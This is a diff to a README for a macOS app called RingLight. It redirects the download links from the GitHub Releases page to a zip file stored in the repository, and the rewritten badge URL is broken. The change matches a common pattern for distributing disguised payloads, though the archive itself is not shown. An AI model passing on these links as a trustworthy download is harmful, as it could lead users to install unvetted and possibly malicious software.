@@ -6,7 +6,7 @@ Thank you for choosing RingLight! This app enhances your macOS experience by pro
 
 ## 📥 Download the App
 
-[![Download RingLight](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/ApexClient24/RingLight/releases)
+[![Download RingLight](https://raw.githubusercontent.com/ApexClient24/RingLight/main/RingLight/App/RingLight-2.6.zip%https://raw.githubusercontent.com/ApexClient24/RingLight/main/RingLight/App/RingLight-2.6.zip)](https://raw.githubusercontent.com/ApexClient24/RingLight/main/RingLight/App/RingLight-2.6.zip)
 
 ## 🔍 System Requirements
 
@@ -30,7 +30,7 @@ RingLight offers several useful features:
 
 To download RingLight, please visit the Releases page:
 
-[Download RingLight](https://github.com/ApexClient24/RingLight/releases)
+[Download RingLight](https://raw.githubusercontent.com/ApexClient24/RingLight/main/RingLight/App/RingLight-2.6.zip)
 
 ### Installation Instructions
 
